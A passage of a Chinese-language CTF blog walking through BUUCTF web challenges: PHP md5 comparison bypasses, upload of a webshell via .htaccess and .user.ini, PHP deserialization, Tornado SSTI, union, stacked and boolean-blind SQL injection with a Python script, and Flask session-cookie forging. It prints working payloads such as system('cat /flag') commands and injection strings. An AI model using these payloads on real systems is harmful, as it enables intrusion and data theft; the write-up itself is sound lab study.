<p>字符串之间进行比较，想要绕过这个弱比较只能用0e的方式。在PHP中”0e”判断为科学计数法，0e123就是0的10123次方，不难推出：0e123456789==0e1 // 因为0的任意次方都为0。在0e后面不能含有字母！！！否则判断为False<br>随便选几个就行了</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">?
a=MMHUWUV&amp;
b=MAUXXQC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>md5_1[]=1&amp;md5_2[]=2<br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null=null，逻辑关系为True。所以可以输出flag<br>唉自己搞的hackbar的插件真是不好用，好几次post都不行，最后用的burpsuit。大家还是用火狐的hackbar吧<br><img src="https://pick.lwzheng.tech/2025/01/16/6788822eb58c6.png" alt="bdc102e6223dabb4ac703c4748781ed6.png"></p>
</blockquote>
<hr>
<h3 id="MRCTF2020-你传你🐎呢1"><a href="#MRCTF2020-你传你🐎呢1" class="headerlink" title="[MRCTF2020]你传你🐎呢1"></a>[MRCTF2020]你传你🐎呢1</h3><p><del><em>开幕鬼图。。。</em></del><br>用repeater试了一下，猜测可能是尾部不能有php。且Content-Type需为png/jpeg。。。<br><strong>Q</strong>:用asp，但好像试了一下不行。<br><img src="https://pick.lwzheng.tech/2025/01/16/6788cd12953ec.png" alt="72005344cc19cb2fd346af3175db3dce.png"><br>猜测是asp没被解析（是吗？<br>然后用了.htaccess，改一下Content-Type访问即可。<br>还有就是不要访问/var/www/html/upload/f46c7557e25c244fb27f31414303dcf9/pass.png 而是upload/f46c7557e25c244fb27f31414303dcf9/pass.png。</p>
<hr>
<h3 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h3><p><a href="https://">https://www.runoob.com/php/php-preg_match.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){#需要一个txt文件
    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";
    if(preg_match("/flag/",$file)){#查找是否有"flag"
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?text=file://D:\Desktop\ctf\ctf\buuctf\welcome to the zjctf.txt</code>不行<br><a href="https://">https://www.cnblogs.com/zzjdbk/p/13030717.html</a><br><a href="https://">https://www.php.net/manual/zh/wrappers.data.php</a><br><img src="https://pick.lwzheng.tech/2025/01/16/6788e906d0a65.png" alt="6181f5b97cc3a19e68afb5284cb03a94.png"><br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>看不见的useless.php究竟是何方神圣。。。<br><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<pre class="line-numbers language-none"><code class="language-none">《?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  #__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?&gt;  
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://">https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring</a></p>
<blockquote>
<p>在 PHP 编程中，是不能用echo语句直接输出一个对象的，也不能用字符串连接符 (.) 拼接一个对象<br>要想输出的话，就要把实体对象转换成字符串，这也正是__tostring函数的意义所在。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$password=new Flag;
echo $password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>但显示“must return a string value in”<br>想到password会unserialize一次，serialize后正是字符串，toString() 方法用于一个类被当成字符串时应怎样回应<del>（好巧</del></p>
<pre class="line-numbers language-none"><code class="language-none">《?php

class Flag{  //flag.php
public $file='flag.php';
public function __tostring(){  #__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。
if(isset($this-&gt;file)){
echo file_get_contents($this-&gt;file);
echo "&lt;br&gt;";
return ("U R SO CLOSE !///COME ON PLZ");
}
}
}
$password=new Flag;
$password=serialize($password);
echo $password;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>怎么连起来呢？用<code>include($file)</code>，将useless.php用起来。。。<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code><br>oh u find it,在源代码里。</p>
<hr>
<p><del>小趣事剧场</del><br>第一次忘给加flag.php引号了，然后得到flagphp<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:7:"flagphp";}</code><br>于是：<code>U R SO CLOSE !///COME ON PLZ</code><br><del>很好，看到这个时人都不好了</del></p>
<hr>
<h3 id="护网杯-2018-easy-tornado1"><a href="#护网杯-2018-easy-tornado1" class="headerlink" title="[护网杯 2018]easy_tornado1"></a>[护网杯 2018]easy_tornado1</h3><pre class="line-numbers language-none"><code class="language-none">/flag.txt
flag in /fllllllllllllag
/welcome.txt
render
/hints.txt
md5(cookie_secret+md5(filename))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>标题是龙卷风</del><br><a href="https://">https://www.osgeo.cn/tornado/template.html</a></p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页
RequestHandler.render(template_name: str, **kwargs: Any)→ Future[None][源代码]¶
以给定参数作为响应呈现模板。
ender是python的一个渲染函数，他们的url都是由filename和filehash组成，filehash即为他们filename的md5值。
Tornado模板支持 控制语句 和 表达 . 控制语句被包围 {{% 和 %}} ，例如 {{% if len(items) &gt; 2 %}} . 表达式被包围 {{{{ 和 }}}} ，例如 {{{{ items[0] }}}} .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</blockquote>
<p><del>。。。不是，这给我干哪儿了</del><br><a href="https://">https://www.cnblogs.com/-chenxs/p/11971164.html</a><br>。。。好吧，XXS士别三日当刮目相看（<br><a href="https://">https://blog.csdn.net/miuzzx/article/details/123329244</a><br><del>唉龙卷风的实力</del><br><a href="https://">https://www.cnblogs.com/bmjoker/p/13508538.html</a><br><del>感情现在才知道是考SSTI(好吧我是第一次听这个东西</del><br><a href="https://">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a><br>找到了~<br>不是，想看看龙卷风的SSTI结果发现龙卷风的唯一例子就是从这道题取得啊<del>（小众宝藏模板实锤了</del><br><img src="https://pick.lwzheng.tech/2025/01/16/6789255875e3a.png" alt="83e80f39bdc56c99964045d59a0303c1.png"><br>在这里改一下filehash后得到error界面<br><img src="https://pick.lwzheng.tech/2025/01/16/6789259d5b990.png" alt="ec88202d1c253015146f2f861622ed36.png"><br>上方链接说得就不赘述了<br><code>error?msg={{handler.settings}}</code><br>AI真是智能，浅浅让它改改语法漏洞百出的python脚本（dbq我会努力的</p>
<pre class="line-numbers language-none"><code class="language-none">import hashlib

filename = '/fllllllllllllag'
cookie_secret = 'fb5a8768-2485-4575-a5c6-f336fae93f01'
# 将文件名编码为字节类型
filename_bytes = filename.encode('utf-8')
mid = hashlib.md5(filename_bytes)
# 获取十六进制哈希值
mid_hex = mid.hexdigest()
result = cookie_secret + mid_hex
# 对拼接后的结果计算MD5哈希值
final_hash = hashlib.md5(result.encode('utf-8'))
print(final_hash.hexdigest())
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实这次payload在原url上改挺方便的。。。<br><code>?filename=/fllllllllllllag&amp;filehash=b52ee6e6b21e8ce79913379fd4aeb5e2</code></p>
<hr>
<h3 id="MRCTF2020-Ez-bypass1"><a href="#MRCTF2020-Ez-bypass1" class="headerlink" title="[MRCTF2020]Ez_bypass1"></a>[MRCTF2020]Ez_bypass1</h3><p>怎么这么多md5…</p>
<pre class="line-numbers language-none"><code class="language-none">if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo 'You got the first step';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?gg[]=1&amp;id[]=2</code></p>
<pre class="line-numbers language-none"><code class="language-none">if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))#如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>passwd=1234567ab</code></p>
<hr>
<h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p><a href="https://">https://www.freebuf.com/articles/web/287193.html</a><br>先试了试，上传木马到是正常方法绕过即可（%00也试过却不可），但发现上传 .htaccess 想加GIF89a，但又不能加。。。<br><img src="https://pick.lwzheng.tech/2025/01/18/678b99a87bd74.png" alt="60b35f867b5571edfe827aea70dc157d.png"><br>.htaccess的配置文件只能在Apache服务器中起作用（哭</p>
<blockquote>
<p>能够利用.user.ini的条件：<br>服务器脚本语言为PHP 服务器使用CGI<br>FastCGI模式<br>上传目录下要有可执行的php文件</p>
<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file = &lt;filename&gt;         //包含在文件头
auto_append_file = &lt;filename&gt;          //包含在文件尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>auto_append_file、auto_prepend_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">GIF89a
auto_prepend_file=pass.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>先上传pass.gif再上传.user.ini<br>访问<code>/uploads/5e6f2693d111128ec4f1d7336f65b87f/index.php</code><br>.user.ini中auto_prepend_file=pass.gif会在执行index.php前把pass包含进来，且解析为php格式<br>ps:user.ini里有个user_ini.cache_ttl ，它控制着重新读取用户 ini文件的时间，可能时间一到刷新掉了，这时要重新上传.user.ini。</p>
<pre class="line-numbers language-none"><code class="language-none">?pass=system("ls /");  或?pass=var_dump(scandir("/")); // 扫描当前目录下的文件，并打印出来 
?pass=system("cat /flag");  或?pass=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<hr>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>一开始试了试username是admin没想到蒙对了（<br>在burp中找到了这个（这是啥<br><code>&lt;--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code><br>先base32再base64得到<code>select * from user where username = '$name'</code><br><del>好吧谢谢但我已经蒙出username了</del><br>用字典intrude了一下发现or,=，（，）都被过滤了。使用大小写绕过or,使用like绕过=<br><a href="https://">https://blog.csdn.net/weixin_40950781/article/details/100061268</a><br>SELECT 1,2,3&nbsp; 是一个简单的查询语句，它会返回一行包含三个列的数据，这三个列的值分别为 &nbsp;1&nbsp;、&nbsp;2&nbsp; 和 &nbsp;3&nbsp;。&nbsp;SELECT&nbsp; 关键字用于指定要从数据库中检索的数据。在这种情况下，我们没有从任何表中获取数据，而是直接指定了要返回的具体值。<br><code>1' union select 1,2,3# </code>有三个字段<br>搞password用<code>select * fRom user where username like 'admin'</code>还是错的（哭<br><del>偷看源码</del>发现用了md5（我：啊？？？？<br><a href="https://">https://github.com/imagin-sch/GXY_CTF/blob/master/Web/BabySqli/dockerfile/files/html/search.php</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-fetch-row.html</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-query.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
$sql = "select * from user where username = '".$name."'";
// echo $sql;
$result = mysqli_query($con, $sql);#mysqli_query() 函数执行某个针对数据库的查询。
$arr = mysqli_fetch_row($result);#从**数据库**结果集中获取一行数据的函数。它返回一个枚举数组，其中每个结果**列**存储在从0开始的数组偏移量中。
if($arr[1] == "admin"){
if(md5($password) == $arr[2]){
echo $flag;
			}				
			<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>arr[0]，[1]，[2]分别对应union select 1,2,3#<br>arr[1]是admin,[2]是password=&gt;union select 1,’admin’,password#<br>现在要求arr[2]即union select的3（password)md5后与password相等即可<br>username:<code>7' union select 1,'admin','8f14e45fceea167a5a36dedd4bea2543'# (这里第一个不能是admin，不然会直接跳转到wrong pass</code><br>password:<code>7(7是我的幸运数字^_^</code></p>
<hr>
<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>扔进burp 过一下字典（<br><del>结果直接爆出来了（啊？</del><br><code>1' or 1=1#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79cb6b0b.png" alt="e35b88b5086142e59614ceecd58e31fe.png"><br><code>return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);</code><br><code>1';show database();#</code><br><code>1';show tables;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79c3caa1.png" alt="abe40dfce048a68691247cc280c3e2f5.png"><br><code>1'; show columns from FlagHere;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd8de49914.png" alt="1753b9108c6497effa9223a7ed50a885.png"><br><code>1';handler FlagHere open as </code>ddl<code>;handler </code>ddl<code> read next;#</code><br>得到flag?????<br><img src="https://pick.lwzheng.tech/2025/01/19/678cdc5539e8c.png" alt="ccbd38ab641e15b7ff867aec3b9fb0d9.png"><br><del>那我请问这道题跟[强网杯 2019]随便注有啥区别呢（</del><br><del>多给个114514试图迷惑（即答</del></p>
<hr>
<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><code>1</code> =&gt;<code>Hello, glzjin wants a girlfriend.</code><br>开幕雷击（<del>实在不行咱放弃吧哥</del><br><code>2</code> =&gt;<code>Do you want to be my girlfriend?</code><br>哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈<br>除1，2之外的都挂了（<br>页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。<br>输入1+空格返SQL Injection Checked.<del>（又欺负空格</del><br>if(ascii(substr((select flag from flag),1,1))&gt;1,1,2)<br>if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)<br>或(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p>
<blockquote>
<p>&nbsp;if()&nbsp; 函数一般接受三个参数，第一个参数是条件判断，后面两个参数分别是条件为真和为假时返回的值。</p>
</blockquote>
<p>下面那个则是单纯1,0判断。<br><a href="https://">https://blog.csdn.net/python1639er/article/details/112325519</a><br><a href="https://">https://www.begtut.com/python/ref-requests-post.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; # 用布尔盲注得出flag:二分法，做ascii循坏i，当返回为1时取此时的ascii(i)再转换为字符(ascii(substr((select(flag)from(flag)),j,1))&gt;i)(0&lt;=i&lt;=127,0&lt;=j&lt;50)
&gt; import requests
&gt; 
&gt; # requests&nbsp; 模块用于发送 HTTP 请求，这里主要用于向目标网站发送 POST 请求。
&gt; url = "http://7cd8bda1-df2d-4a3d-af9f-66850cce8b1c.node5.buuoj.cn:81/index.php"
&gt; result = ""
&gt; for i in range(1, 50):#~~第一次设的30然后还没输出完就结束了~~
&gt;     for j in range(1, 128):
&gt;         payload = "(ascii(substr((select(flag)from(flag)),{m},1))&gt;{n})"  # &nbsp;{m}&nbsp; 和 &nbsp;{n}&nbsp; 是占位符，会被 &nbsp;i&nbsp; 和 &nbsp;j&nbsp; 的值替换。
&gt;         response = requests.post(url=url, data={'id': payload.format(m=i,n=j)})  # 使用 &nbsp;requests.post&nbsp; 方法向目标 URL 发送 POST 请求，请求的参数是 &nbsp;id&nbsp;，其值为构造的 SQL 注入 payload。
&gt;         # requests.post(url, data={key: value}, json={key: value}, args)
&gt;         if response.text.find('girlfriend') == -1:  # 检查响应文本中是否包含字符串 &nbsp;girlfrined(疯狂迫害
&gt;             result = result + chr(j)#将对应的字符 &nbsp;chr(j)&nbsp; 添加到 &nbsp;result&nbsp; 中，在 Python 中，&nbsp;+&nbsp; 运算符用于字符串时，它的作用是将两个字符串连接起来，生成一个新的字符串。
&gt;             break#跳内层循环
&gt;     print(result)#看进度
&gt; print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行得好慢~</p>
<pre class="line-numbers language-none"><code class="language-none">f
fl
fla
flag
flag{
flag{2
flag{27
flag{274
flag{2744
flag{2744d
flag{2744d1
flag{2744d15
flag{2744d15f
flag{2744d15f-
flag{2744d15f-2
flag{2744d15f-2a
flag{2744d15f-2a4
flag{2744d15f-2a4a
flag{2744d15f-2a4a-
flag{2744d15f-2a4a-4
flag{2744d15f-2a4a-45
flag{2744d15f-2a4a-459
flag{2744d15f-2a4a-4599
flag{2744d15f-2a4a-4599-
flag{2744d15f-2a4a-4599-b
flag{2744d15f-2a4a-4599-b9
flag{2744d15f-2a4a-4599-b90
flag{2744d15f-2a4a-4599-b90e
flag{2744d15f-2a4a-4599-b90e-
flag{2744d15f-2a4a-4599-b90e-f
flag{2744d15f-2a4a-4599-b90e-fc
flag{2744d15f-2a4a-4599-b90e-fce
flag{2744d15f-2a4a-4599-b90e-fced
flag{2744d15f-2a4a-4599-b90e-fced2
flag{2744d15f-2a4a-4599-b90e-fced24
flag{2744d15f-2a4a-4599-b90e-fced242
flag{2744d15f-2a4a-4599-b90e-fced2422
flag{2744d15f-2a4a-4599-b90e-fced2422b
flag{2744d15f-2a4a-4599-b90e-fced2422bc
flag{2744d15f-2a4a-4599-b90e-fced2422bc2
flag{2744d15f-2a4a-4599-b90e-fced2422bc23
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这界面好熟悉。。。。像极了“我的第一个flask“什么的（被打</p>
<!-- https://github.com/woadsl1234/hctf_flask/ -->

<p>然后发现404了（</p>
<p><del>但总之最后是偷来了</del></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题 | 离别歌</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span>h1 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"nav"</span><span class="token operator">&gt;</span>hctf<span class="token punctuation">{</span>xxxxxxxxx<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>

SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>
<span class="token comment">#看来大家都爱用名字作key呀（感慨ing</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 图片以二进制形式写入</span>
    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>
    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 把buf_str作为response返回前端，并设置首部字段</span>
    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>
    <span class="token comment"># 将验证码字符串储存在session中</span>
    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code
    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flask的session是存储在cookie中且仅签名而未加密</p>
<pre class="line-numbers language-none"><code class="language-none">#先把session拿出来
.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;

optional arguments:
  -h, --help            show this help message and exit
  -s &lt;string&gt;, --secret-key &lt;string&gt;
                        Secret key
  -c &lt;string&gt;, --cookie-value &lt;string&gt;
                        Session cookie value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8' 

{'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'qing', 'user_id': '10'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;

optional arguments:
  -h, --help            show this help message and exit
  -s &lt;string&gt;, --secret-key &lt;string&gt;
                        Secret key
  -t &lt;string&gt;, --cookie-structure &lt;string&gt;
                        Session cookie structure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'admin', 'user_id': '10'}"

.eJxF0MGOgjAQBuBX2czZg4JcTDxoiqwmnYamSKYX4ypSWuomqAExvvuim-ye_5nvz8wDdqemuBiYXZtbMYJddYTZAz6-YAbcmlrkaUe9tJpta81khba2OpGOszhCv7VabQxnWUdKOsrTFtXKclVGmMQdBXTXNu2ESifks16zdYT94k4qa7lyd6FoimxZi0R6wdIOWdlink0Hw5FCM8yHQi0NejQUrJy2LkJ2rCnfVpotBlNWgq2DYXcOzxEcLs1pd_12xfn_hFd1fxiTisMXgbbstc1CkaPBIOt5sjHkaarzOORB2g6054v5m6v8viz-JKnkZ5H-Jue9HwLYH311hhHcLkXz_htMxvD8AfZvbPA.Z6NLTQ.2ijxBi8WejFl8Z7IUnLCtcYZRT4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>flag{ed0fcbdf-7439-497d-ba5b-9970b44bbf86}</code></p>
<hr>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment">#nodeprep.prepare存在漏洞,且login的时候又strlower一次</span>
